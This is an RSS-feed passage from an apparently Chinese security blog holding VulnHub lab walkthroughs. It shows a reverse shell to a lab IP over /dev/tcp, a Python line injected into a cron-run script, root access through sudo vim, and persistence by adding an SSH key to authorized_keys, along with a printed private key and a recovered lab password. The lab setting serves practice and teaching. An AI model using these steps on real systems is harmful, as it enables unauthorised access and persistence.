&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-022.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;nc -lvvp 4444&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-023.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获得管理员账户：daniel 密码：C@ughtm3napping&lt;br&gt;
 注意这里的 %40 是 url 编码的 @&lt;/p&gt;
&lt;h3 id=&#34;定时任务反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务反弹shell&#34;&gt;#&lt;/a&gt; 定时任务反弹 shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;得到账号密码，可以登入服务器，ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmRhbmllbEAxOTIuMTY4LjMxLjE3MA==&#34;&gt;daniel@192.168.31.170&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-024.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;观察 /home 文件，分析可提权的文件&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat query.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat site_status.txt | head -n 10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tail -n 10 site_status.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-025.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对方有一个定时任务，用来检测网站是否正常，如果正常的话，会将日志打印出来，这里我们以 adrian 这个用户执行反弹该用户权限的 shell.&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/dev/shm/是linux下一个非常有用的目录，因为这个目录不在硬盘上，而是在内存里。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /dev/shm/shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-026.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在query.py中添加此命令，用来执行反弹shell的命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt;&amp;gt; query.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;#x27;/usr/bin/bash /dev/shm/shell.sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-027.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听 4444 端口，等待定时任务被执行，shell成功反弹出来&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过下面的命令来把终端标准一点显示：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; then press Ctrl+Z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg then press ENTER twice&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-028.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;vim-shell提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vim-shell提权&#34;&gt;#&lt;/a&gt; vim-shell 提权&lt;/h3&gt;
&lt;p&gt;列出用户权限或检查特定命令&lt;br&gt;
 &lt;code&gt;sudo -l&lt;/code&gt; &lt;br&gt;
 这里发现有可调用 root 执行无密码的 vim 命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-029.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提权超级丰富的网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&#34;&gt;https://gtfobins.github.io/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;直接写一个 vim shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo vim -c ‘:!/bin/sh’ 表示以root权限去写vim shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-030.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;篡改authorized_keys维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#篡改authorized_keys维权&#34;&gt;#&lt;/a&gt; 篡改 authorized_keys 维权&lt;/h3&gt;
&lt;p&gt;靶机：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;给靶机打印公钥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;ssh-rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AAAAB3NzaC1yc2EAAAADAQABAAABgQCysSKgDq+5dEpirNHGl2j+ceqNRQHnSAHgQ3zsKqmUn9iyks&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5L07z9Y34OEvUsYAxsFgdLtdD+MxufPPQwj8a77hmcqWguq5EmJUiZ7fA/peddvGR9Q5ypMpkuMFm2W2gIg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kVG+b4XPCQ0ydC9gn8ac7dReeMIykcD+vcQgpvHniK45rqAJJwbnb9MxNGDuPQHlSCSGA3FtHayNNsAmC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+ek1m2Qk3oVUF/8XGnjHvw2fMTog8h41Se8lYgHLDf8o4IibuOxxxpNVYOIgUZ0Ahvg9+srGvzquDS/yqXDf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;06aBGHj+ISjOZ9wrB/Qmg3ArylKCaRk8UztsXg4gkCKiGiAynYY/EqNzXAuR42A1lby+kf9FUwSXGp8wdRG&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;YVc3yOWQm+lHy5Ov1RqdSCsMMYkyqAOV+2weoRki9iONN8h7YVWX9hBoVPpRiLKDfG3aLkjRVyPrpx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+qVHNo8rYHI9zjiTAhM/PJFarLhMEg+e3AvbEPBCN6p5lmO3lAdXX40= root@earth&amp;#x27; &amp;gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击机：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;给攻击机打印私钥，注意私钥里边的第一行不能有空行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NhAAAAAwEAAQAAAYEAsrEioA6vuXRKYqzRxpdo/nHqjUUB50gB4EN87CqplJ/YspLOS9O&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/WN+DhL1LGAMbBYHS7XQ/jMbnzz0MI/Gu+4ZnKloLquRJiVIme3wP6XnXbxkfUOcqTKZLj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BZtltoCIJFRvm+FzwkNMnQvYJ/GnO3UXnjCMpHA/r3EIKbx54iuOa6gCScG52/TMTRg7j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;B5UgkhgNxbR2sjTbAJgvnpNZtkJN6FVBf/Fxp4x78NnzE6IPIeNUnvJWIByw3/KOCIm7js&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ccaTVWDiIFGdAIb4PfrKxr86rg0v8qlw3/dOmgRh4/iEozmfcKwf0JoNwK8pSgmkZPFM7b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;F4OIJAiohogMp2GPxKjc1wLkeNgNZW8vpH/RVMElxqfMHURmFXN8jlkJvpR8uTr9UanUgr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DDGJMqgDlftsHqEZIvYjjTfIe2FVl/YQaFT6UYiyg3xt2i5I0Vcj66cfqlRzaPK2ByPc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kwITPzyRWqy4TBIPntwL2xDwQjeqeZZjt5QHV1+NAAAFgL9tgH2/bYB9AAAAB3NzaC1yc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EAAAGBALKxIqAOr7l0SmKs0caXaP5x6o1FAedIAeBDfOwqqZSf2LKSzkvTvP1jfg4S9Sxg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DGwWB0u10P4zG5889DCPxrvuGZypaC6rkSYlSJnt8D+l5128ZH1DnKkymS4wWbZbaAiCRU&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b5vhc8JDTJ0L2Cfxpzt1F54wjKRwP69xCCm8eeIrjmuoAknBudv0zE0YO49AeVIJIYDcW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drI02wCYL56TWbZCTehVQX/xcaeMe/DZ8xOiDyHjVJ7yViAcsN/yjgiJu47HHGk1Vg4iBR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nQCG+D36ysa/Oq4NL/KpcN/3TpoEYeP4hKM5n3CsH9CaDcCvKUoJpGTxTO2xeDiCQIqIaI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DKdhj8So3NcC5HjYDWVvL6R/0VTBJcanzB1EZhVzfI5ZCb6UfLk6/VGp1IKwwxiTKoA5X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bB6hGSL2I403yHthVZf2EGhU+lGIsoN8bdouSNFXI+unH6pUc2jytgcj3OOJMCEz88kVqs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uEwSD57cC9sQ8EI3qnmWY7eUB1dfjQAAAAMBAAEAAAGBAJ6lZ5FlGJx1Y6lRt/kx6hSlfN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gpp7P4GTpLkLh4dBCxDgoVDrUBqvPohjzmlees6rp3oEiWhpN5OpfY3Q/URmQJU5HkUcvF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pNuSFHAdcMSBffWZ0jnocklB0//PC4c8hhOv3OPTzPICAj8fwoTOPBx3ChV7OpdOR1iAUy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PEYZwLiNZSethUKIjYN8RnpX/mEDo/Kyip1Ghn/U3gYWOYugZ22hpXqaWRM9LswLQ5pLxE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NGyE4Bx9IV7w1ogyENLzG60Eycb80YF7UX1a3wwT1MmhdXTHe23mPZ0NAS0vXgX/Z5za7Y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mZhSvWyEY9OSuscnQMARLD07y8lmCiMvdpy/u7mEM9xq+qy/1RpAi+b1xFifZPjvTSKPpz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+UXrQXhInPY20mUX6UtJtzK6uH4wbfhewSaBG/QKCTJwmqWWuGOO/juBfdrESvBkrRXRrX&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;XjKnGo1/3KCYegY6lnLZdYIFGLchDQSsoAcRojLSarMDR/GS2p4UJqU2eGLlGDG+4PfQAA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AMASNt36l5t/f9gR/6qD+WVARaYc8EvlczrR6TiWNGd0UUti31Px9PKFETku/hWcHLjlRS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BJxxMm0uMbBgh+oiOHlIcJz5PRuKHzC48kn/n8YcPs7C00UiR4JuQzxMQuJPXYntaks/YU&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nH30fGkrBY14Db4MEF2WEIYCGbbD6FROxVoA39oXAeMRtC9VTbhgc5WiGjW8kadZgAyEvn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;krfRtv9hDn1pyquiS7L8bAI+klJgulyuO8beLsNX0oMkw+RbAAAADBANxEmaC8oVnD8pRL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JfTzIIg7OI9g1gXPrT/ZlMgfxxlfQiWdQqoqmQfX4EthskAVwS3n9n7h4E5/4IOU+aLmn+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mrsx6aZhwVeF3bHLRfQmRqf6WBc58upcUrZqWPQ5hZfBzpDZFddixjhS0FU3rDlrEJJ9WL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;R2D/q769sgV4dAXerLW643w3IKJA3liRQpBLrmcUHeN0VCbVfBVfrfz3lWN8vcikX2cSj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Vhp4jiMkroUJhEMm90N0rnAG/VfXiEXwAAAMEAz63xywZopECaqv8LSXlOAbLpNyKj/TQ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1XCOW9N3/DxE7swiSQmP35aoj3D2BmaaBIfTI+Jgxaoq8GUI/tSpgVVTVxQAHTByorVWLn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yDxM27xB4+20KVa8+LUbe7t3tK40cbzo6i4+0TCyM2M0Oxq2242c8jv1A9gMuSLT3B4Wj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fXSe1ypztVEyPr0LnB9khH9nyLe9IhChYAG6mPW31I0dnrtmy2UdMkOwscMuqKwpevijY&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PJaNWLEHEcEcOTAAAACnJvb3RAZWFydGg=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27; &amp;gt;&amp;gt; ~/.ssh/vulnhub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-031.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用ssh私钥登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 700 ~/.ssh/vulnhub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.170 -i ~/.ssh/vulnhub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 成功登陆到了对方服务器&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/105%20EARTH/</guid>
            <title>VULNHUB 5 EARTH</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/105%20EARTH/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtZWFydGgsNzU1Lw==&#34;&gt;https://www.vulnhub.com/entry/the-planets-earth,755/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbGVjYWxpZGEvYXJ0aWNsZS9kZXRhaWxzLzEyMTMxNjkzNA==&#34;&gt;https://blog.csdn.net/valecalida/article/details/121316934&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 EARTH：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-060.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
